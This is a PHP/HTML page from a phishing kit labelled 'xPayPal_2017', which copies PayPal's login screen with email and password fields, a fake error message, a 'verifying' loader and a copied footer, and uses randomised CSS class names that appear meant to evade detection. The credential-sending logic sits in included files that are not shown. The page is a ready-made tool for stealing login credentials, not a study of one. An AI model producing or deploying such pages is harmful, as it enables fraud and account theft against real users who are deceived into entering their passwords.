<?php
include 'inc/config.php';
include 'language.php';
?>
    <html lang="en">

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <link rel="stylesheet" href="./file/font-sans.css">
        <link rel="stylesheet" href="./file/template.css">
        <link rel="stylesheet" href="./file/css.css">
        <title>Log in to your PayPal account</title>
        <meta name="description" content="xPayPal_2017 v1.1 | Coded By CaZaNoVa163">
        <meta name="author" content="CaZaNoVa163">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <script type="text/javascript" src="./file/jquery.min.js"></script>
        <script type="text/javascript" src="./file/jstz.min.js"></script>
        <script type="text/javascript" src="./file/jquery.mobile.custom.min.js"></script>
        <script type="text/javascript" src="./file/jquery.browser.min.js"></script>
        <link rel="icon" type="image/png" href="img/favicon.ico">
    </head>

    <body>
        <div id="loader" class="2vkwkakgi8ootu 81blna46q8bjqybjrxvd9wpg6nvl spinner gl69nhmobj6alfrah1t6nx6 dc7rzip6ul59tiowsky5qf6z">
            <p id="loading_title">Verifying your information…</p>
        </div>
        <div id="ajax" style="opacity: 1;">
            <script type="text/javascript" src="./file/script.js"></script>
            <div class="houo3paom4aad0hec52hsa container">
                <div class="8o0151fhvhjz9r5bmxk6yrx row form">
                    <div id="login_form">
                        <div id="header"></div>
                        <div class="bf6 a5xj2edd v4yowxweflm2ylk0m 3t63u2r twelve columns error_login u-full-width">Some information you entered doesn't look right.</div>
                        <div class="kc094z29 pt31j1 f twelve columns">
                            <input type="text" class="cxcdcx757z5dk twelve columns u-full-width" name="user" id="user" value="<?php echo $_SESSION['EMAIL'];?>" placeholder="Email address" style="border-color: rgb(157, 163, 166);">
                            <div id="error_user" style="display: none;">Enter your email address.</div>
                            <div id="error_icon_user" style="opacity: 0;"></div>
                        </div>
                        <div class="zdfhw77zuzeu3e twelve columns">
                            <input type="password" class="k2 a8v4cedg4sfu1rxgf7nviz0z twelve columns u-full-width" name="pass" id="pass" value="" placeholder="Enter your password">
                            <div id="error_pass">Enter your password.</div>
                            <div id="error_icon_pass"></div>
                        </div>
                        <div class="6wjiemx6uwmlb2kdw4bv twelve columns">
                            <input type="submit" class="zj1sv5eq817097yqkgy872i8fylg k6zuxifsn button-primary u-full-width" name="xSubmit" id="xSubmit" value="Log In">
                        </div>
                        <div id="forget" class="ibh1v 0ey1ymnxixsx6ufesp twelve columns">Having trouble logging in?</div>
                        <input type="submit" class="6fysptnn86i7vip0vf76j3qaqufphq button twelve columns" name="" id="" value="Sign Up">


                    </div>
                </div>
                <div class="thl jqh82himvzllbqljaf9ov2 row">
                    <div id="footer">Contact Us&nbsp;&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;&nbsp;Legal&nbsp;&nbsp;&nbsp;Worldwide</div>
                </div>
            </div>
        </div>
    </body>

    </html>
